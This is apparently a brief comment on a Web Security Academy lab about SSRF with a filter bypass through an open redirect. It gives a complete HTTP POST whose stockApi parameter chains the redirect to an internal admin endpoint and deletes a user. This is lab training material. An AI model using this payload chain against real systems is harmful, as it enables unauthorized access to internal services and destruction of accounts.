SSRF with filter bypass via open redirection vulnerability

The solution provided is good, the hint to use http://192.168.0.12:8080 is very useful, just be careful that the admin url should be in the stockApi parameter and not in the GET request:

POST /product/stock HTTP/1.1
Host: acf41f671e46f3e18032578e003e00e7.web-security-academy.net
Connection: close
Cookie: session=S9Jx1PXPmmVJwliEXENzQqtpMiWwJcgO

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
